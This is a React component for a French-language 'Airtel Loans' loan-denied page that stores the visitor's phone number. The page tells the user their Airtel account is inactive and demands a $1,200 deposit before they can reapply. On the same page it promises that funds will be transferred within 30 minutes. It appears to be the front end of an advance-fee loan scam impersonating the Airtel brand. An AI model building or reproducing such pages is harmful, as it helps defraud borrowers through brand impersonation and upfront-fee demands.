import React from 'react';
import { useNavigate } from 'react-router-dom';
import './App.css';

function AirtelDenied() {
  const navigate = useNavigate();

  const handleGoToDashboard = () => {
    // Clear the session so the user starts fresh
    localStorage.removeItem('airtelPhone');
    navigate('/');
  };

  return (
    <div className="airtel-container">
      {/* Header Section */}
      <div className="airtel-header">
        <div className="airtel-hamburger">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="black" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="3" y1="12" x2="21" y2="12"></line>
            <line x1="3" y1="6" x2="21" y2="6"></line>
            <line x1="3" y1="18" x2="21" y2="18"></line>
          </svg>
        </div>
        <h1 className="airtel-logo">Airtel Loans</h1>
        <p className="airtel-tagline">Prêts rapides. À tout moment. Partout.</p>
      </div>

      {/* Main White Card */}
      <div className="airtel-card">
        {/* Denied Icon */}
        <div className="airtel-denied-icon">
          <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#DA1C1C" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <circle cx="12" cy="12" r="10"></circle>
            <line x1="12" y1="8" x2="12" y2="12"></line>
            <line x1="12" y1="16" x2="12.01" y2="16"></line>
          </svg>
        </div>

        <h2 className="airtel-denied-heading">Prêt refusé !</h2>
        <p className="airtel-denied-subtext">Votre prêt a été refusé</p>

        {/* Inactive Airtel Box */}
        <div className="airtel-inactive-box">
          <div className="airtel-inactive-title">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#DA1C1C" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <rect x="2" y="5" width="20" height="14" rx="2"></rect>
              <line x1="2" y1="10" x2="22" y2="10"></line>
            </svg>
            <span>Compte Airtel inactif</span>
          </div>
          <p className="airtel-inactive-text">Veuillez déposer au moins</p>
          <p className="airtel-inactive-amount">1 200 $</p>
          <p className="airtel-inactive-text">sur votre compte Airtel pour l'activer et refaire une demande</p>
        </div>

        {/* Checklist Box */}
        <div className="airtel-checklist-box">
          <div className="airtel-checklist-item">
            <span className="checkmark">✓</span> Les fonds seront transférés sur votre compte dans les 30 minutes
          </div>
          <div className="airtel-checklist-item">
            <span className="checkmark">✓</span> Période de remboursement du prêt : 12 mois
          </div>
          <div className="airtel-checklist-item">
            <span className="checkmark">✓</span> Vous pouvez maintenant accéder à votre tableau de bord Fast Credit
          </div>
        </div>

        {/* Dashboard Button */}
        <button className="airtel-dashboard-btn" onClick={handleGoToDashboard}>
          Aller au tableau de bord
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="5" y1="12" x2="19" y2="12"></line>
            <polyline points="12 5 19 12 12 19"></polyline>
          </svg>
        </button>

        {/* Back to Login */}
        <button className="airtel-back-to-login" onClick={() => navigate('/')}>
          Retour à la connexion
        </button>
      </div>
    </div>
  );
}

export default AirtelDenied;